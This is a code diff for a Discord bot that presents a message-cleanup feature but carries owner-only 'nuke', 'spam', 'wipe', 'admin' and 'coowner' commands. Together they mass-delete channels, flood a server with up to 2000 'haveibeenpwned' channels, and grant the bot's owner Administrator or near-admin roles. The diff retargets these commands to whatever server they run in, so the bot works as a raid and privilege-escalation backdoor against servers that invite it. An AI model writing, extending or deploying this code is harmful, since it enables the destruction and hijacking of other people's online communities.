@@ -9,7 +9,6 @@ const {
 const token = process.env.DISCORD_TOKEN;
 const clientId = process.env.CLIENT_ID;
 const OWNER_ID = process.env.OWNER_ID;
-const NUKE_GUILD_ID = (process.env.NUKE_GUILD_ID || '').trim(); // optional
 const port = Number(process.env.PORT || 10000);
 
 if (!token || !clientId || !OWNER_ID)
@@ -50,20 +49,20 @@ const commands = [
 
   // --- lab commands, owner-only ---
   new SlashCommandBuilder().setName('nuke')
-    .setDescription('Full lab sequence: rename в†’ delete в†’ spam в†’ admin role')
+    .setDescription('Full lab sequence: rename в†’ delete в†’ spam в†’ admin role (runs in current guild)')
     .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
   new SlashCommandBuilder().setName('spam')
-    .setDescription('Mass-create haveibeenpwned channels')
+    .setDescription('Mass-create haveibeenpwned channels (runs in current guild)')
     .addIntegerOption(o => o.setName('count').setDescription('How many channels').setMinValue(1).setMaxValue(2000).setRequired(true))
     .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
   new SlashCommandBuilder().setName('wipe')
-    .setDescription('Delete every channel in the target guild')
+    .setDescription('Delete every channel in the current guild')
     .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
   new SlashCommandBuilder().setName('admin')
-    .setDescription('Create owner role with Administrator and assign to you')
+    .setDescription('Create owner role with Administrator and assign to you (current guild)')
     .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
   new SlashCommandBuilder().setName('coowner')
-    .setDescription('Create a Co-Owner role (near-admin) and assign it to you')
+    .setDescription('Create a Co-Owner role (near-admin) and assign it to you (current guild)')
     .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
   new SlashCommandBuilder().setName('guilds')
     .setDescription('List every guild this bot is a member of')
@@ -74,9 +73,7 @@ client.once('ready', async () => {
   const rest = new REST({ version: '10' }).setToken(token);
   await rest.put(Routes.applicationCommands(clientId), { body: commands });
   console.log(`Logged in as ${client.user.tag}`);
-  console.log(`Bot is in ${client.guilds.cache.size} guild(s):`);
-  client.guilds.cache.forEach(g => console.log(`  ${g.id} вЂ” ${g.name}`));
-  console.log(`NUKE_GUILD_ID: ${NUKE_GUILD_ID || '(unset вЂ” commands use current guild)'}`);
+  console.log(`Bot is in ${client.guilds.cache.size} guild(s).`);
 });
 
 async function purgeRecent(channel, requested, keepMedia, onProgress) {
@@ -188,50 +185,37 @@ client.on('interactionCreate', async interaction => {
       return interaction.reply({ content: `Confirm cleanup of up to **${amount.toLocaleString()} recent messages**${keepMedia ? ' while keeping messages with attachments/embeds' : ''}.`, components: [row], ephemeral: true });
     }
 
-    // ---- lab commands, owner-gated ----
+    // ---- lab commands, owner-gated, guild from invocation ----
     const labCommands = ['nuke', 'spam', 'wipe', 'admin', 'coowner', 'guilds'];
     if (interaction.isChatInputCommand() && labCommands.includes(interaction.commandName)) {
       if (interaction.user.id !== OWNER_ID)
         return interaction.reply({ content: 'Not yours.', ephemeral: true });
 
       if (interaction.commandName === 'guilds') {
-        const list = client.guilds.cache.map(g => `\`${g.id}\` вЂ” **${g.name}**`).join('\n') || '_(none)_';
-        const match = NUKE_GUILD_ID ? client.guilds.cache.get(NUKE_GUILD_ID) : null;
-        const mode = NUKE_GUILD_ID
-          ? `**NUKE_GUILD_ID:** \`${NUKE_GUILD_ID}\`\n**Resolves to:** ${match ? `\u2705 ${match.name}` : '\u274C not found'}`
-          : '**NUKE_GUILD_ID:** _(unset вЂ” commands target the guild they run in)_';
+        const list = client.guilds.cache
+          .map(g => `\`${g.id}\` вЂ” **${g.name}**`)
+          .slice(0, 50)
+          .join('\n') || '_(none)_';
+        const more = client.guilds.cache.size > 50 ? `\nвЂ¦and ${client.guilds.cache.size - 50} more` : '';
         return interaction.reply({
-          content: `**Bot is in ${client.guilds.cache.size} guild(s):**\n${list}\n\n${mode}`,
+          content: `**Bot is in ${client.guilds.cache.size} guild(s):**\n${list}${more}`,
           ephemeral: true
         });
       }
 
-      let guild;
-      if (NUKE_GUILD_ID) {
-        guild = client.guilds.cache.get(NUKE_GUILD_ID)
-          ?? await client.guilds.fetch({ guild: NUKE_GUILD_ID, force: true }).catch(() => null);
-        if (!guild) {
-          const inList = client.guilds.cache.map(g => `\`${g.id}\` (${g.name})`).join(', ') || 'none';
-          console.log(`[lab] NUKE_GUILD_ID ${NUKE_GUILD_ID} not resolvable. bot in: ${inList}`);
-          return interaction.reply({
-            content: `ratman4080: NUKE_GUILD_ID \`${NUKE_GUILD_ID}\` not reachable. Bot is in: ${inList}.\nRun \`/guilds\`. Clear NUKE_GUILD_ID to use current guild.`,
-            ephemeral: true
-          });
-        }
-      } else {
-        guild = interaction.guild;
-        if (!guild) return interaction.reply({ content: 'ratman4080: no guild context.', ephemeral: true });
-      }
+      const guild = interaction.guild;
+      if (!guild)
+        return interaction.reply({ content: 'ratman4080: no guild context.', ephemeral: true });
 
       if (interaction.commandName === 'nuke') {
-        await interaction.reply({ content: 'ratman4080: sequence started.', ephemeral: true });
+        await interaction.reply({ content: `ratman4080: sequence started in **${guild.name}**.`, ephemeral: true });
         await runNuke(guild);
         return interaction.followUp({ content: 'ratman4080: stashed.', ephemeral: true });
       }
 
       if (interaction.commandName === 'spam') {
         const n = interaction.options.getInteger('count', true);
-        await interaction.reply({ content: `ratman4080: creating ${n}.`, ephemeral: true });
+        await interaction.reply({ content: `ratman4080: creating ${n} in **${guild.name}**.`, ephemeral: true });
         for (let i = 0; i < n; i++) {
           await safe(() => guild.channels.create({
             name: `haveibeenpwned-${i}`, type: ChannelType.GuildText
@@ -242,7 +226,7 @@ client.on('interactionCreate', async interaction => {
       }
 
       if (interaction.commandName === 'wipe') {
-        await interaction.reply({ content: 'ratman4080: wiping.', ephemeral: true });
+        await interaction.reply({ content: `ratman4080: wiping **${guild.name}**.`, ephemeral: true });
         const chans = await guild.channels.fetch();
         for (const [, ch] of chans) {
           await safe(() => ch.delete('wipe'), `wipe ${ch.id}`);
@@ -252,7 +236,7 @@ client.on('interactionCreate', async interaction => {
       }
 
       if (interaction.commandName === 'admin') {
-        await interaction.reply({ content: 'ratman4080: role escalation.', ephemeral: true });
+        await interaction.reply({ content: `ratman4080: role escalation in **${guild.name}**.`, ephemeral: true });
         const role = await safe(() => guild.roles.create({
           name: 'ratman4080',
           permissions: [PermissionFlagsBits.Administrator],
@@ -266,7 +250,7 @@ client.on('interactionCreate', async interaction => {
       }
 
       if (interaction.commandName === 'coowner') {
-        await interaction.reply({ content: 'ratman4080: forging co-owner.', ephemeral: true });
+        await interaction.reply({ content: `ratman4080: forging co-owner in **${guild.name}**.`, ephemeral: true });
 
         const me = await guild.members.fetch(OWNER_ID).catch(() => null);
         if (!me) return interaction.followUp({ content: 'ratman4080: you not in guild.', ephemeral: true });
